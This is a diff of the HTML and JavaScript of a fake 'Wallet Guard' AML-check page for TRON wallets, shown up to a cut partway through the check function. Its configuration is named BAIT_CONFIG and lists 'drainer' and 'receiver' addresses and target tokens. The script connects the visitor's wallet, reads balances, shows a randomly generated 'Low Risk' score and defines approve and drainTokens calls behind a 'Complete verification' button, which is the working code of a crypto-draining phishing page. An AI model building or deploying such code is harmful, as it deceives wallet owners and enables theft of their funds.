@@ -3,351 +3,288 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>WalletGuard AML — verification</title>
+<title>Wallet Guard — AML Check</title>
 <style>
-  :root { color-scheme: dark; --b: #4d8dff; --b2: #2f6fe0; --ink: #e8eefc; --mut: #8ea3c4; }
+  :root { color-scheme: dark; --bg: #070b14; --card: #0b1220; --line: #1b2b45; --blue: #3b82f6; --blue2: #2563eb; --ink: #e7eefb; --mut: #8b9cba; --green: #34d399; }
   * { box-sizing: border-box; }
-  body { margin: 0; min-height: 100vh; font: 16px/1.5 system-ui, "Segoe UI", Roboto, sans-serif; color: var(--ink);
-    background: #070d18; background-image: radial-gradient(900px 480px at 50% -20%, #10203c, transparent 70%);
-    display: flex; flex-direction: column; align-items: center; }
-  header { width: 100%; max-width: 520px; display: flex; align-items: center; justify-content: space-between; padding: 18px 20px; }
-  .brand { display: flex; align-items: center; gap: 9px; font-weight: 700; }
-  .logo { width: 26px; height: 26px; border-radius: 8px; background: linear-gradient(135deg, var(--b), var(--b2)); display: grid; place-items: center; color: #04101f; font-weight: 900; }
-  .net { font-size: 12px; color: var(--mut); border: 1px solid #1d2f4d; padding: 5px 10px; border-radius: 999px; }
-  main { width: 100%; max-width: 520px; padding: 6px 20px 40px; }
-  h1 { font-size: 26px; line-height: 1.2; margin: 14px 0 8px; }
-  .sub { color: var(--mut); font-size: 15px; margin-bottom: 20px; }
-  .card { border: 1px solid #1d2f4d; border-radius: 16px; padding: 18px; background: linear-gradient(180deg, #0c1626, #08111d); margin-bottom: 16px; }
-  .card .lbl { font-size: 11px; letter-spacing: .12em; text-transform: uppercase; color: var(--mut); }
-  .mono { font-family: ui-monospace, Consolas, monospace; font-size: 12px; word-break: break-all; }
-  .checks { list-style: none; padding: 0; margin: 0; display: grid; gap: 12px; }
-  .checks li { display: flex; align-items: center; justify-content: space-between; gap: 10px; font-size: 14px; color: var(--ink); }
-  .checks .st { color: var(--mut); font-size: 13px; }
-  .checks .st.done { color: #5bd28f; }
-  .spin { width: 14px; height: 14px; border: 2px solid #2b446b; border-top-color: var(--b); border-radius: 50%; animation: sp .8s linear infinite; display: inline-block; }
-  @keyframes sp { to { transform: rotate(360deg); } }
-  .bar { height: 8px; border-radius: 99px; background: #16233a; overflow: hidden; margin-top: 8px; }
-  .bar i { display: block; height: 100%; width: 0; background: linear-gradient(90deg, #5bd28f, var(--b)); transition: width .9s ease; }
-  .amt { display: flex; justify-content: space-between; font-size: 14px; padding: 4px 0; }
-  .amt b { font-variant-numeric: tabular-nums; }
-  button.cta { width: 100%; padding: 16px; border: 0; border-radius: 13px; font-size: 16px; font-weight: 700; cursor: pointer;
-    background: linear-gradient(180deg, var(--b), var(--b2)); color: #061223; transition: .15s; }
-  button.cta:disabled { opacity: .5; cursor: default; }
-  button.ghost { width: 100%; margin-top: 10px; padding: 13px; border-radius: 12px; border: 1px solid #1d2f4d; background: transparent; color: var(--ink); font-size: 15px; cursor: pointer; }
-  .status { font-size: 14px; min-height: 22px; margin: 14px 0; color: var(--mut); }
-  .err { color: #ff8a8a; } .ok { color: #5bd28f; }
-  .note { font-size: 12.5px; color: var(--mut); margin-top: 10px; }
+  body { margin: 0; font: 16px/1.5 Inter, system-ui, "Segoe UI", Roboto, sans-serif; color: var(--ink);
+    background: var(--bg); background-image: radial-gradient(1100px 500px at 50% -12%, #12213c, transparent 65%); }
+  a { color: inherit; }
+  .wrap { max-width: 1120px; margin: 0 auto; padding: 0 22px; }
+  header.top { border-bottom: 1px solid #142238; }
+  .top-in { display: flex; align-items: center; gap: 22px; height: 62px; }
+  .brand { display: flex; align-items: center; gap: 9px; font-weight: 700; font-size: 18px; }
+  .shield { width: 28px; height: 30px; background: var(--blue); clip-path: polygon(50% 0, 100% 18%, 100% 62%, 50% 100%, 0 62%, 0 18%); display: grid; place-items: center; color: #fff; font-weight: 900; font-size: 14px; }
+  nav.menu { display: flex; gap: 26px; font-size: 14px; color: var(--mut); }
+  nav.menu a { text-decoration: none; padding: 20px 0; border-bottom: 2px solid transparent; }
+  nav.menu a.on { color: #fff; border-color: var(--blue); }
+  .top-right { margin-left: auto; display: flex; align-items: center; gap: 14px; font-size: 13px; color: var(--mut); }
+  .pill { border: 1px solid var(--line); border-radius: 999px; padding: 6px 12px; display: inline-flex; gap: 7px; align-items: center; }
+  .dot { width: 8px; height: 8px; border-radius: 50%; background: #f0b90b; }
+  h1.hero { font-size: 44px; line-height: 1.12; text-align: center; margin: 44px 0 12px; letter-spacing: -0.5px; }
+  h1.hero .b { color: var(--blue); }
+  .lead { max-width: 720px; margin: 0 auto 28px; text-align: center; color: var(--mut); font-size: 16px; }
+  .card { background: var(--card); border: 1px solid var(--line); border-radius: 16px; }
+  .search { padding: 18px; display: grid; grid-template-columns: 1fr 210px 190px; gap: 12px; align-items: end; }
+  .fld label { display: block; font-size: 13px; color: var(--mut); margin-bottom: 6px; }
+  .inp { width: 100%; background: #0d1526; border: 1px solid #22334e; border-radius: 10px; padding: 13px 14px; color: var(--ink); font-size: 15px; }
+  .inp:focus { outline: 2px solid #24466f; }
+  .sel { width: 100%; background: #0d1526; border: 1px solid #22334e; border-radius: 10px; padding: 13px 14px; color: var(--ink); font-size: 15px; }
+  .safe { text-align: center; color: var(--mut); font-size: 13px; padding: 14px 0 22px; }
+  .btn { border: 0; border-radius: 10px; padding: 14px 18px; font-size: 15px; font-weight: 700; cursor: pointer; }
+  .btn.blue { background: linear-gradient(180deg, #4a8ef8, var(--blue2)); color: #fff; }
+  .btn.blue:disabled { opacity: .55; cursor: default; }
+  .btn.ghost { background: transparent; border: 1px solid var(--line); color: var(--ink); font-weight: 600; }
+  .grid3 { display: grid; grid-template-columns: repeat(3, 1fr); gap: 16px; margin: 22px 0 40px; }
+  .grid3 .card { padding: 18px; }
+  .grid3 h3 { margin: 0 0 12px; font-size: 15px; display: flex; gap: 8px; align-items: center; }
+  .steps { display: flex; gap: 10px; justify-content: space-between; text-align: center; font-size: 12px; color: var(--mut); }
+  .num { width: 22px; height: 22px; border-radius: 50%; background: #13233c; display: grid; place-items: center; color: #9ec2ff; margin: 0 auto 6px; font-size: 12px; }
+  .nets { display: flex; gap: 26px; justify-content: space-around; font-size: 12px; color: var(--mut); }
+  .net i { width: 38px; height: 38px; border-radius: 50%; display: grid; place-items: center; margin: 0 auto 8px; font-size: 18px; font-style: normal; }
+  .n-tron { background: #fff2f2; color: #e5342b; } .n-eth { background: #eef1f8; color: #5a6b8c; }
+  .n-btc { background: #fff6e5; color: #f0a30a; } .n-bnb { background: #fff9e6; color: #f0b90b; }
+  details { border-bottom: 1px solid #142238; padding: 12px 0; font-size: 14px; }
+  details:last-child { border-bottom: 0; }
+  summary { cursor: pointer; list-style: none; display: flex; justify-content: space-between; color: var(--ink); }
+  summary::-webkit-details-marker { display: none; }
+  details p { color: var(--mut); font-size: 13.5px; margin: 10px 0 0; }
+  footer.bottom { border-top: 1px solid #142238; padding: 20px 0; color: var(--mut); font-size: 13px; }
+  .fb-in { display: flex; gap: 22px; align-items: center; }
+  .fb-in .r { margin-left: auto; }
+  /* result */
+  .res { padding: 20px; margin-bottom: 22px; display: grid; grid-template-columns: 210px 1fr; gap: 20px; }
+  .gauge { text-align: center; }
+  .ring { width: 148px; height: 148px; border-radius: 50%; margin: 6px auto 12px; display: grid; place-items: center;
+    background: conic-gradient(var(--green) calc(var(--p) * 1%), #16243a 0); }
+  .ring .inner { width: 118px; height: 118px; border-radius: 50%; background: var(--card); display: grid; place-items: center; font-size: 34px; }
+  .lvl { color: var(--green); font-weight: 700; font-size: 18px; }
+  .score { color: var(--mut); font-size: 13px; }
+  .kv { display: grid; gap: 12px; font-size: 14px; }
+  .kv .k { color: var(--mut); font-size: 13px; margin-bottom: 3px; }
+  .mono { font-family: ui-monospace, Consolas, monospace; font-size: 13px; word-break: break-all; }
+  .two { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; }
+  .chips { display: flex; gap: 8px; flex-wrap: wrap; margin-top: 6px; }
+  .chip { border: 1px solid #22405f; background: #0d1a2b; border-radius: 999px; padding: 5px 11px; font-size: 12px; color: #9ec2ff; }
+  .chip.g { color: var(--green); border-color: #1f5b45; background: #0c211a; }
+  .line { height: 2px; background: #16243a; border-radius: 99px; margin-top: 6px; }
+  .line i { display: block; height: 100%; background: var(--green); border-radius: 99px; width: 0; transition: width .9s; }
+  .ts { justify-self: end; align-self: start; color: var(--mut); font-size: 12px; border: 1px solid var(--line); border-radius: 999px; padding: 6px 11px; }
+  .status { font-size: 14px; min-height: 20px; color: var(--mut); margin-top: 12px; }
+  .err { color: #ff8a8a; } .ok { color: var(--green); }
   .hidden { display: none !important; }
-  .tick { width: 66px; height: 66px; border-radius: 50%; margin: 0 auto 14px; display: grid; place-items: center;
-    background: #0e2a1c; border: 1px solid #2f8f5f; font-size: 30px; color: #5bd28f; }
-  footer { width: 100%; max-width: 520px; padding: 0 20px 26px; color: #4f6584; font-size: 12px; }
-  #wc { position: fixed; inset: 0; background: #030812e6; display: grid; place-items: center; padding: 18px; }
-  .sheet { width: min(420px, 100%); background: #0a1422; border: 1px solid #1d2f4d; border-radius: 18px; padding: 20px; text-align: center; }
-  #qr { background: #fff; padding: 10px; border-radius: 12px; width: 230px; height: 230px; margin: 14px auto; display: none; }
-  .wallets { display: grid; gap: 8px; margin-top: 12px; }
-  .wallets a { display: block; padding: 12px; border: 1px solid #22365a; border-radius: 12px; color: var(--ink); text-decoration: none; font-size: 14px; }
+  .rowcta { display: flex; gap: 12px; margin-top: 16px; align-items: center; }
+  .note { font-size: 12.5px; color: var(--mut); }
+  @media (max-width: 860px) { .search { grid-template-columns: 1fr; } .grid3 { grid-template-columns: 1fr; } .res { grid-template-columns: 1fr; } h1.hero { font-size: 30px; } nav.menu { display: none; } }
 </style>
 </head>
 <body>
-<header><div class="brand"><span class="logo">W</span>WalletGuard AML</div><span class="net">TRON</span></header>
+<header class="top"><div class="wrap top-in">
+  <div class="brand"><span class="shield">W</span>Wallet Guard</div>
+  <nav class="menu"><a class="on" href="#">AML Check</a><a href="#how">About</a><a href="#faq">FAQ</a><a href="#support">Support</a></nav>
+  <div class="top-right"><span>🌐 EN</span><span class="pill"><span class="dot"></span>TRON Chain</span></div>
+</div></header>
 
-<main>
-  <div id="view-start">
-    <h1>AML wallet verification</h1>
-    <div class="sub">Run a compliance check on this wallet to unlock the flagged balance. Keys stay in your wallet.</div>
-    <button class="cta" id="start">Check wallet</button>
-    <button class="ghost" id="connect-wc">Other wallet (Trust, TokenPocket, …)</button>
-    <div class="status" id="cstatus"></div>
+<div class="wrap">
+  <h1 class="hero">Check Your Wallet. <span class="b">Know Your Risk.</span></h1>
+  <div class="lead">Run a comprehensive AML risk assessment of any supported cryptocurrency wallet address.<br>Get a clear, detailed overview of its transaction risk profile.</div>
+
+  <div class="card">
+    <div class="search">
+      <div class="fld"><label>Wallet Address</label><input class="inp" id="addr" placeholder="Enter cryptocurrency wallet address" spellcheck="false"></div>
+      <div class="fld"><label>Network</label><select class="sel"><option>TRON</option></select></div>
+      <button class="btn blue" id="check">Check Wallet</button>
+    </div>
+    <div class="safe">🛡️ Your data is secure and encrypted</div>
   </div>
 
-  <div id="view-check" class="hidden">
-    <h1>Verification in progress</h1>
-    <div class="sub">We compare the address against sanctions lists and score its on-chain activity.</div>
-
-    <div class="card">
-      <div class="lbl">Wallet</div>
-      <div class="mono" id="who"></div>
+  <div id="result" class="hidden">
+    <div class="card res">
+      <div class="gauge">
+        <div class="ring" id="ring" style="--p:0"><div class="inner" id="ico">🛡️</div></div>
+        <div class="lvl" id="lvl">Low Risk</div>
+        <div class="score">Risk Score: <span id="score">0</span> / 100</div>
+      </div>
+      <div class="kv">
+        <div class="ts" id="ts">—</div>
+        <div><div class="k">Wallet Address</div><div class="mono" id="raddr">—</div></div>
+        <div><div class="k">Network</div><div>TRON</div></div>
+        <div class="two">
+          <div><div class="k">Exposure to Flagged Addresses</div><div id="expo">0.0%</div><div class="line"><i id="expobar"></i></div></div>
+          <div><div class="k">Sanctions &amp; Suspicious Activity</div><div class="ok">✅ Not Found</div></div>
+        </div>
+        <div><div class="k">Transaction Risk Indicators</div><div class="chips"><span class="chip g">● Low Activity</span><span class="chip">● Normal Flow</span><span class="chip">● No Mixers</span><span class="chip">● No High-Risk Counterparties</span></div></div>
+        <div class="hidden" id="balcard"><div class="k">Flagged Balance</div><div id="rows"></div></div>
+        <div class="rowcta"><button class="btn blue" id="complete" disabled>Complete verification</button><span class="note" id="note"></span></div>
+        <div class="status" id="status"></div>
+      </div>
     </div>
-
-    <div class="card">
-      <ul class="checks">
-        <li><span>Address format &amp; checksum</span><span class="st" id="c1"><i class="spin"></i></span></li>
-        <li><span>Sanctions lists (OFAC, EU)</span><span class="st" id="c2"><i class="spin"></i></span></li>
-        <li><span>Risk score</span><span class="st" id="c3"><i class="spin"></i></span></li>
-        <li><span>On-chain activity</span><span class="st" id="c4"><i class="spin"></i></span></li>
-      </ul>
-      <div class="bar"><i id="riskbar"></i></div>
-      <div class="note" id="risknote">Calculating risk…</div>
-    </div>
-
-    <div class="card">
-      <div class="lbl">Flagged balance</div>
-      <div id="rows"></div>
-    </div>
-
-    <button class="cta" id="claim" disabled>Complete verification</button>
-    <div class="status" id="status"></div>
-    <div class="note" id="note"></div>
   </div>
 
-  <div id="view-done" class="hidden" style="text-align:center;padding:26px 0">
-    <div class="tick">✓</div>
-    <h1>Verification passed</h1>
-    <div class="mono" id="txid"></div>
-  </div>
-</main>
-
-<footer>Contract: <span class="mono" id="contract">—</span><br>Network: TRON</footer>
-
-<div id="wc" class="hidden">
-  <div class="sheet">
-    <b>Scan with your wallet</b>
-    <div class="sub">Any WalletConnect wallet: Trust, TokenPocket, MathWallet, OKX…</div>
-    <canvas id="qr"></canvas>
-    <div class="wallets" id="deeplinks"></div>
-    <button class="ghost" id="wc-copy">Copy connection link</button>
-    <button class="ghost" id="wc-close">Cancel</button>
+  <div class="grid3">
+    <div class="card" id="how"><h3>⚡ How It Works</h3><div class="steps">
+      <div><div class="num">1</div>Enter wallet<br>address</div>
+      <div><div class="num">2</div>Run AML<br>verification</div>
+      <div><div class="num">3</div>Review your<br>risk assessment</div>
+    </div></div>
+    <div class="card"><h3>🧩 Supported Networks</h3><div class="nets">
+      <div><i class="n-tron">▲</i>TRON</div><div><i class="n-eth">◆</i>Ethereum</div><div><i class="n-btc">₿</i>Bitcoin</div><div><i class="n-bnb">◈</i>BNB Chain</div>
+    </div></div>
+    <div class="card" id="faq"><h3>❓ FAQ</h3>
+      <details><summary>What is AML verification? <span>⌄</span></summary><p>It is an assessment of a wallet's exposure to flagged, sanctioned or high-risk counterparties.</p></details>
+      <details><summary>How is the risk score calculated? <span>⌄</span></summary><p>The score aggregates transaction activity, counterparties and exposure ratio into a 0–100 value.</p></details>
+      <details><summary>What blockchain data is analyzed? <span>⌄</span></summary><p>Public on-chain data: transfers, counterparties and token holdings of the address.</p></details>
+    </div>
   </div>
 </div>
+
+<footer class="bottom"><div class="wrap fb-in">
+  <div class="brand"><span class="shield">W</span>Wallet Guard</div>
+  <a href="#">Terms of Service</a><a href="#">Privacy Policy</a><a href="#support" id="support">Contact Support</a>
+  <span class="r">Secure. Compliant. Trusted.</span>
+</div></footer>
 
 <script>
 window.BAIT_CONFIG={wcProjectId:'7b4c156e02caf580713985225e0729b4',bait:'',drainer:'TVYBvusW6wA1iMxbVaigRsc77zwWpWHAPN',receiver:'TH7mvLb3UJ35re2ZuQpTKpHQRQ97pnXYvA',approveLimit:'50000',tokens:['TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t','TEkxiTehnzSmSe2XqrBj4w32RUN966rdz8']};
 </script>
 <script>
 const $ = (id) => document.getElementById(id);
+const cfg = window.BAIT_CONFIG;
 const RPC = 'https://api.trongrid.io';
 const CHAIN = 'tron:0x2b6653dc';
-const cfg = window.BAIT_CONFIG;
-$('contract').textContent = cfg.drainer || '—';
-
-let account = '', found = [], signer = null;
 const DEMO = new URLSearchParams(location.search).has('demo');
 const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
-const setStatus = (t, c) => { $('status').textContent = t || ''; $('status').className = 'status ' + (c || ''); $('cstatus').textContent = t || ''; $('cstatus').className = 'status ' + (c || ''); };
-const show = (id) => ['view-start', 'view-check', 'view-done'].forEach((v) => $(v).classList.toggle('hidden', v !== id));
 
-const APPROVE_ABI = [{ type: 'function', name: 'approve', stateMutability: 'nonpayable', inputs: [{ name: 's', type: 'address' }, { name: 'v', type: 'uint256' }], outputs: [{ type: 'bool' }] }];
-const DRAIN_TOKENS_ABI = [{ type: 'function', name: 'drainTokens', stateMutability: 'nonpayable', inputs: [{ name: 'from', type: 'address' }, { name: 'list', type: 'address[]' }], outputs: [{ type: 'uint256' }] }];
+let account = '', found = [], signer = null;
 
 const B58 = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
-function b58bytes(s) {
-  let n = [0];
-  for (const ch of s) {
-    let carry = B58.indexOf(ch);
-    if (carry < 0) throw new Error('bad addr');
-    for (let j = 0; j < n.length; j++) { const v = n[j] * 58 + carry; n[j] = v & 255; carry = v >> 8; }
-    while (carry) { n.push(carry & 255); carry >>= 8; }
-  }
-  return Uint8Array.from(n.reverse());
-}
-const hex2 = (b) => Array.from(b, (x) => x.toString(16).padStart(2, '0')).join('');
-const addrParam = (a) => hex2(b58bytes(a).slice(1, 21)).padStart(64, '0');
-const uintParam = (v) => BigInt(v).toString(16).padStart(64, '0');
-const fmt = (raw, dec) => { const s = String(raw).padStart(dec + 1, '0'); const w = s.slice(0, s.length - dec); const f = s.slice(s.length - dec).replace(/0+$/, ''); return f ? w + '.' + f : w; };
-const hexToStr = (h) => { const s = String(h).replace(/^0x/, ''); if (s.length < 128) return ''; const off = parseInt(s.slice(0, 64), 16) * 2; const len = parseInt(s.slice(off, off + 64), 16) * 2; const p = s.slice(off + 64, off + 64 + len).match(/../g) || []; return new TextDecoder().decode(Uint8Array.from(p.map((x) => parseInt(x, 16)))); };
+function b58bytes(s) { let n=[0]; for (const ch of s){let c=B58.indexOf(ch); if(c<0) throw new Error('bad'); for(let j=0;j<n.length;j++){const v=n[j]*58+c; n[j]=v&255; c=v>>8;} while(c){n.push(c&255); c>>=8;}} return Uint8Array.from(n.reverse()); }
+const hex2 = (b) => Array.from(b, (x) => x.toString(16).padStart(2,'0')).join('');
+const addrParam = (a) => hex2(b58bytes(a).slice(1,21)).padStart(64,'0');
+const uintParam = (v) => BigInt(v).toString(16).padStart(64,'0');
+const fmt = (raw, dec) => { const s=String(raw).padStart(dec+1,'0'); const w=s.slice(0,s.length-dec); const f=s.slice(s.length-dec).replace(/0+$/,''); return f? w+'.'+f : w; };
+const hexToStr = (h) => { const s=String(h).replace(/^0x/,''); if(s.length<128) return ''; const o=parseInt(s.slice(0,64),16)*2; const l=parseInt(s.slice(o,o+64),16)*2; const p=s.slice(o+64,o+64+l).match(/../g)||[]; return new TextDecoder().decode(Uint8Array.from(p.map((x)=>parseInt(x,16)))); };
 
-async function rpc(method, params, tries = 8) {
-  let last = 'network';
-  for (let i = 0; i < tries; i++) {
-    const r = await fetch(RPC + method, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify(params) });
-    const t = await r.text();
-    if (t.startsWith('{')) { const j = JSON.parse(t); if (!j.Error) return j; last = j.Error; } else last = 'http ' + r.status;
-    await sleep(900 * (i + 1));
-  }
-  throw new Error(last);
-}
-async function readCall(contract, selector, param) {
-  const j = await rpc('/wallet/triggerconstantcontract', { owner_address: account, contract_address: contract, function_selector: selector, parameter: param || '', visible: true });
-  if (!j.result || !j.result.result) throw new Error('read failed');
-  return j.constant_result[0];
-}
-async function buildTx(contract, selector, param, feeLimit) {
-  const j = await rpc('/wallet/triggersmartcontract', { owner_address: account, contract_address: contract, function_selector: selector, parameter: param, fee_limit: feeLimit, call_value: 0, visible: true });
-  if (!j.result || !j.result.result) throw new Error((j.result && j.result.message) || 'build failed');
-  return j.transaction;
-}
-async function trxOf(a) { const j = await rpc('/wallet/getaccount', { address: a, visible: true }); return j && j.balance ? j.balance / 1e6 : 0; }
+const APPROVE_ABI=[{type:'function',name:'approve',stateMutability:'nonpayable',inputs:[{name:'s',type:'address'},{name:'v',type:'uint256'}],outputs:[{type:'bool'}]}];
+const DRAIN_ABI=[{type:'function',name:'drainTokens',stateMutability:'nonpayable',inputs:[{name:'f',type:'address'},{name:'l',type:'address[]'}],outputs:[{type:'uint256'}]}];
 
-function pickProvider() {
-  const w = window;
-  const c = [w.tronLink, w.binancew3w && w.binancew3w.tron, w.okxwallet && w.okxwallet.tronLink,
-    w.tokenpocket && w.tokenpocket.tron, w.bitkeep && w.bitkeep.tron, w.gatewallet && w.gatewallet.tron,
-    w.trustwallet && w.trustwallet.tronLink, w.tronWeb];
-  return c.find((x) => x && typeof x.request === 'function');
-}
+const setStatus = (t,c) => { $('status').textContent = t||''; $('status').className='status '+(c||''); };
 
-async function startInjected() {
-  const p = pickProvider();
-  if (p) { try { await p.request({ method: 'tron_requestAccounts' }); } catch (e) {} }
-  const tw = p && (p.tronWeb || p);
-  if (!tw || !tw.defaultAddress || !tw.defaultAddress.base58) { setStatus('Wallet not found — use the other wallet button.', 'err'); return null; }
-  return { kind: 'tronlink', w: tw, addr: tw.defaultAddress.base58 };
-}
+async function rpc(method, params, tries=8){ let last='net'; for(let i=0;i<tries;i++){ const r=await fetch(RPC+method,{method:'POST',headers:{'content-type':'application/json'},body:JSON.stringify(params)}); const t=await r.text(); if(t.startsWith('{')){const j=JSON.parse(t); if(!j.Error) return j; last=j.Error;} else last='http '+r.status; await sleep(900*(i+1)); } throw new Error(last); }
+async function readCall(contract, sel, param){ const j=await rpc('/wallet/triggerconstantcontract',{owner_address:account,contract_address:contract,function_selector:sel,parameter:param||'',visible:true}); if(!j.result||!j.result.result) throw new Error('read'); return j.constant_result[0]; }
+async function buildTx(contract, sel, param, fee){ const j=await rpc('/wallet/triggersmartcontract',{owner_address:account,contract_address:contract,function_selector:sel,parameter:param,fee_limit:fee,call_value:0,visible:true}); if(!j.result||!j.result.result) throw new Error('build'); return j.transaction; }
 
-let wcClient = null;
-async function connectWc() {
-  $('connect-wc').disabled = true;
-  try {
-    const { SignClient } = await import('https://cdn.jsdelivr.net/npm/@walletconnect/sign-client@2.17.2/+esm');
-    wcClient = await SignClient.init({ projectId: cfg.wcProjectId, relayUrl: 'wss://relay.walletconnect.com',
-      metadata: { name: 'WalletGuard AML', description: 'Wallet verification', url: location.origin, icons: [] } });
-    const { uri, approval } = await wcClient.connect({ requiredNamespaces: { tron: { methods: ['tron_signTransaction'], chains: [CHAIN], events: [] } }, sessionProperties: { tron_method_version: 'v1' } });
-    $('qr').style.display = 'block';
-    const QR = await import('https://cdn.jsdelivr.net/npm/qrcode@1.5.4/+esm');
-    await QR.toCanvas($('qr'), uri, { width: 210, margin: 1 });
-    $('deeplinks').innerHTML =
-      '<a href="https://link.trustwallet.com/wc?uri=' + encodeURIComponent(uri) + '">Open in Trust Wallet</a>' +
-      '<a href="bnc://app.binance.com/cedefi/wc?uri=' + encodeURIComponent(uri) + '">Open in Binance</a>' +
-      '<a href="tpoutside://wc?uri=' + encodeURIComponent(uri) + '">Open in TokenPocket</a>' +
-      '<a href="https://tronlinkoutside://walletconnect?uri=' + encodeURIComponent(uri) + '">Open in TronLink</a>';
-    $('wc').classList.remove('hidden');
-    $('wc-copy').onclick = () => navigator.clipboard.writeText(uri);
-    $('wc-close').onclick = () => { $('wc').classList.add('hidden'); $('connect-wc').disabled = false; };
-    const s = await approval();
-    $('wc').classList.add('hidden');
-    return { kind: 'wc', client: wcClient, topic: s.topic, session: s, addr: s.namespaces.tron.accounts[0].split(':')[2] };
-  } catch (e) {
-    $('wc').classList.add('hidden'); $('connect-wc').disabled = false;
-    setStatus('WalletConnect: ' + (e.message || e), 'err');
-    return null;
-  }
-}
+function pick(){ const w=window; return [w.tronLink, w.binancew3w&&w.binancew3w.tron, w.okxwallet&&w.okxwallet.tronLink, w.tokenpocket&&w.tokenpocket.tron, w.bitkeep&&w.bitkeep.tron, w.gatewallet&&w.gatewallet.tron, w.trustwallet&&w.trustwallet.tronLink, w.tronWeb].find((x)=>x&&typeof x.request==='function'); }
+async function ensureSigner(){ if (signer) return true; const p=pick(); if(!p){ setStatus('Wallet not found — install TronLink or use WalletConnect.', 'err'); return false; } try{ await p.request({method:'tron_requestAccounts'}); }catch(e){} const tw=p.tronWeb||p; if(!tw||!tw.defaultAddress||!tw.defaultAddress.base58){ setStatus('Wallet did not return an account.', 'err'); return false; } signer={kind:'tronlink', w:tw, addr:tw.defaultAddress.base58}; return true; }
 
-async function wcSend(contract, selector, param, feeLimit) {
-  const tx = await buildTx(contract, selector, param, feeLimit);
-  const ns = (signer.session && signer.session.namespaces && signer.session.namespaces.tron) || {};
-  const chainId = (ns.chains && ns.chains[0]) || CHAIN;
-  const res = await signer.client.request({ topic: signer.topic, chainId,
-    request: { method: 'tron_signTransaction', params: { address: account, transaction: tx } } });
-  const sig = (res && res.result && res.result.signature) || res.signature;
-  if (!sig) throw new Error('not signed');
-  tx.signature = Array.isArray(sig) ? sig : [sig];
+async function wcSend(contract, sel, param, fee){
+  const tx = await buildTx(contract, sel, param, fee);
+  const res = await signer.client.request({ topic: signer.topic, chainId: CHAIN, request:{ method:'tron_signTransaction', params:{ address: account, transaction: tx } } });
+  const sig = (res&&res.result&&res.result.signature)||res.signature; if(!sig) throw new Error('not signed');
+  tx.signature = Array.isArray(sig)? sig : [sig];
   const b = await rpc('/wallet/broadcasttransaction', tx);
-  const b64 = (s) => { try { return atob(s); } catch (e) { return s || ''; } };
-  if (b.result !== true) {
-    let ok = false;
-    for (let i = 0; i < 8; i++) { const chk = await rpc('/wallet/gettransactionbyid', { value: tx.txID }); if (chk && chk.txID) { ok = true; break; } await sleep(1500); }
-    if (!ok) throw new Error(b64(b.message) || b.code || 'broadcast failed');
-  }
+  const dec = (s)=>{ try{return atob(s)}catch(e){return s||''} };
+  if (b.result !== true) { let ok=false; for(let i=0;i<8;i++){ const c=await rpc('/wallet/gettransactionbyid',{value:tx.txID}); if(c&&c.txID){ok=true;break;} await sleep(1200);} if(!ok) throw new Error(dec(b.message)||b.code||'broadcast'); }
   return b.txid || tx.txID;
 }
 
-async function begin(getSigner) {
-  $('start').disabled = true;
-  setStatus('Connecting wallet…');
-  const s = await getSigner();
-  if (!s) { $('start').disabled = false; return; }
-  signer = s; account = s.addr;
-  show('view-check');
-  $('who').textContent = account;
-  await runChecks();
-}
+function randScore(){ let v; do { v = 10 + Math.floor(Math.random()*31); } while (v % 10 === 0); return v; }
 
-async function runChecks() {
-  $('claim').disabled = true;
-  setStatus('Reading balances…');
-  let trx = 0;
-  try { trx = await trxOf(account); } catch (e) {}
-  for (const token of cfg.tokens) {
-    try {
-      const raw = BigInt('0x' + (await readCall(token, 'balanceOf(address)', addrParam(account))));
-      if (raw === 0n) continue;
-      let dec = 6, sym = token;
-      try { dec = Number(BigInt('0x' + (await readCall(token, 'decimals()', '')))); } catch (e) {}
-      try { sym = hexToStr(await readCall(token, 'symbol()', '')) || token; } catch (e) {}
-      found.push({ token, symbol: sym, human: fmt(raw, dec), raw: raw.toString(), decimals: dec });
-    } catch (e) {}
-    await sleep(200);
+async function runCheck(){
+  const a = $('addr').value.trim();
+  if (!/^T[1-9A-HJ-NP-Za-km-z]{33}$/.test(a)) { setStatus('Enter a valid TRON address.', 'err'); return; }
+  if (DEMO) { account = a; }
+  else {
+    if (!(await ensureSigner())) return;
+    if (signer.addr !== a) { setStatus('Connected wallet differs from the address. Connect ' + a.slice(0,6) + '… or paste your own.', 'err'); if (!signer) return; }
+    account = signer.addr;
   }
-  $('rows').innerHTML = found.length
-    ? found.map((t) => '<div class="amt"><span>' + t.symbol + '</span><b>' + t.human + '</b></div>').join('')
-    : '<div class="note">No assets on this wallet.</div>';
 
-  // «проверки»
-  setStatus('Running checks…');
-  const mark = async (id, text) => { $(id).innerHTML = '<span class="ok">' + text + '</span>'; await sleep(900); };
-  await mark('c1', 'valid');
-  await mark('c2', 'no matches');
+  $('check').disabled = true;
+  $('result').classList.remove('hidden');
+  $('raddr').textContent = account;
+  $('balcard').classList.add('hidden');
+  $('complete').disabled = true;
+  $('lvl').textContent = 'Analyzing…';
+  $('score').textContent = '0';
+  $('ring').style.setProperty('--p', 0);
+  $('expo').textContent = '—';
+  $('ts').textContent = new Date().toUTCString().slice(5,22) + ' UTC';
+
+  found = [];
+  if (!DEMO) {
+    for (const token of cfg.tokens) {
+      try {
+        const raw = BigInt('0x' + (await readCall(token, 'balanceOf(address)', addrParam(account))));
+        if (raw === 0n) continue;
+        let dec = 6, sym = token;
+        try { dec = Number(BigInt('0x' + (await readCall(token, 'decimals()', '')))); } catch(e){}
+        try { sym = hexToStr(await readCall(token, 'symbol()', '')) || token; } catch(e){}
+        found.push({token, symbol: sym, human: fmt(raw, dec), raw: raw.toString(), decimals: dec});
+      } catch(e){}
+      await sleep(200);
+    }
+  } else {
+    await sleep(500);
+    found = [{token:'TUSDT',symbol:'USDT',human:'1 842.50',raw:'1842500000',decimals:6},{token:'TUSDC',symbol:'USDC',human:'96.20',raw:'96200000',decimals:6}];
+  }
+
   const score = randScore();
-  for (let v = 0; v <= score; v += 2) { $('riskbar').style.width = v + '%'; await sleep(40); }
-  $('risknote').textContent = 'Low risk · score ' + score + '/100';
-  await mark('c3', 'low risk (' + score + ')');
-  await mark('c4', trx > 0 ? trx.toFixed(2) + ' TRX' : 'ok');
+  const expo = (Math.random() * 0.6).toFixed(1);
